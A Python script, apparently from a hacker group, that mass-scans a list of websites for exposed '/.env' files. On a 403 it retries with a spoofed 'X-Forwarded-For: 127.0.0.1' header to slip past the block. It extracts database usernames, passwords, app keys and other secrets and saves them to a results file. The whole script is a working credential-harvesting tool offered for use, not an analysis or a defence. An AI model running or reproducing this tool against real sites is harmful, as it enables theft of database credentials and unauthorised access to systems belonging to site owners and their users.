import re
import requests
import threading
import os
import time

RED = "\033[91m"
RESET = "\033[0m"
GREEN = "\033[92m"
BLUE = "\033[94m"

BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", ".."))
SEARCH_DIRS = [
    BASE_DIR,  
    os.path.join(BASE_DIR, "xenpaibot", "tools1", "z1"),  
    os.path.join(BASE_DIR, "xenpaibot", "tools1", "admincheck"),  
]

def find_file(filename):
    for directory in SEARCH_DIRS:
        file_path = os.path.join(directory, filename)
        print(f"{BLUE}[DEBUG] Checking: {file_path}{RESET}") 
        
        if os.path.exists(file_path):
            print(f"{GREEN}[DEBUG] File '{filename}' found in: {file_path}{RESET}")
            return file_path
    print(f"{RED}[ERROR] File '{filename}' not found in any search directories.{RESET}")
    return None

def WarningBanner():
    print("\033c", end="")  # Membersihkan layar
    warning = f"""{RED}
   ЁЯЪл THIS TOOL IS NOT FOR SALE!!  ЁЯЪл
{RESET}"""
    print(warning + "\n")

def Banner():
    print("\033c", end="")  # Membersihkan layar
    __banner__ = f"""{RED}
   ____           ____                          
  / __/__ _  __  / __/______ ____  ___  ___ ____
 / _// _ \ |/ / _\ \/ __/ _ `/ _ \/ _ \/ -_) __/
/___/_//_/___/ /___/\__/\_,_/_//_/_//_/\__/_/   
          {BLUE}Author : VinzXploits x Kanezama
           Team : JABAR ERROR SYSTEM x SABUN BOLONG CYBER CLUB                                                                    
{RESET}"""
    print(__banner__ + "\n")

def fetch_env_file(url):
    """Fetch the .env file from the specified URL, attempting bypass if necessary."""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
    }
    try:
        response = requests.get(url + "/.env", headers=headers, timeout=5)
        if response.status_code == 200 and "=" in response.text:
            return response.text
        elif response.status_code == 403:
            print(f"{BLUE}[!] 403 Forbidden detected, attempting bypass for {url}...{RESET}")
            bypass_headers = headers.copy()
            bypass_headers["X-Forwarded-For"] = "127.0.0.1"
            bypass_headers["Referer"] = url
            response = requests.get(url + "/.env", headers=bypass_headers, timeout=5)
            if response.status_code == 200 and "=" in response.text:
                return response.text
    except requests.RequestException:
        pass
    return None

def parse_env_content(env_content):
    env_data = {}
    for line in env_content.splitlines():
        if "=" in line:
            key, value = line.split("=", 1)
            env_data[key.strip()] = value.strip()
    return {k: v for k, v in {
        "database": env_data.get("DB_DATABASE"),
        "username": env_data.get("DB_USERNAME"),
        "password": env_data.get("DB_PASSWORD"),
        "app_name": env_data.get("APP_NAME"),
        "app_env": env_data.get("APP_ENV"),
        "app_key": env_data.get("APP_KEY"),
        "app_debug": env_data.get("APP_DEBUG"),
        "app_url": env_data.get("APP_URL"),
    }.items() if v}

def find_vulnerabilities(env_content):
    """Analyze .env content for potential vulnerabilities."""
    vulnerabilities = []
    if re.search(r"API_KEY=.*", env_content):
        vulnerabilities.append("[!] API key detected in .env file.")
    if re.search(r"SECRET_KEY=.*", env_content):
        vulnerabilities.append("[!] Secret key detected in .env file.")
    if re.search(r"DEBUG=(True|true|1)", env_content):
        vulnerabilities.append("[!] Debug mode is enabled in production.")
    return vulnerabilities

def save_to_file(url, method, parsed_data, vulnerabilities):
    with open("results-env.txt", "a") as file:
        file.write(f"URL: {url}\n")
        file.write(f"METHOD: {method}\n")
        for key, value in parsed_data.items():
            file.write(f"{key.upper()}: {value}\n")
        if vulnerabilities:
            file.write("VULNERABILITIES:\n")
            for vuln in vulnerabilities:
                file.write(f"- {vuln}\n")
        file.write("=" * 50 + "\n\n")

def process_url(url):
    """Process a single URL."""
    print(f"[+] Processing URL: {url}")
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url

    env_content = fetch_env_file(url)
    if env_content:
        parsed_data = parse_env_content(env_content)
        vulnerabilities = find_vulnerabilities(env_content)

        if parsed_data or vulnerabilities:
            save_to_file(url=url, method="/.env", parsed_data=parsed_data, vulnerabilities=vulnerabilities)
            print(f"{GREEN}[+] Valid data saved.{RESET}")
        else:
            print(f"{RED}[!] No valid data found.{RESET}")
    else:
        print(f"{RED}[!] No valid data found.{RESET}")

def main():
    input_file = input("Input list (ex: subdomains.txt): ").strip()
    
    file_path = find_file(input_file)  
    
    if not file_path:
        print(f"{RED}[ERROR] File '{input_file}' not found!{RESET}")
        return
    
    print(f"{GREEN}[INFO] Using input file: {file_path}{RESET}")
    
    try:
        with open(file_path, "r") as file:
            urls = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"{RED}[!] File not found.{RESET}")
        return
    
    num_threads = int(input("Masukkan jumlah threads (contoh: 50): ").strip())
    threads = []
    
    for url in urls:
        thread = threading.Thread(target=process_url, args=(url,))
        thread.start()
        threads.append(thread)
        if len(threads) >= num_threads:
            for t in threads:
                t.join()
            threads = []
    
    for t in threads:
        t.join()

if __name__ == "__main__":
    WarningBanner()
    time.sleep(1) 
    Banner()
    main()
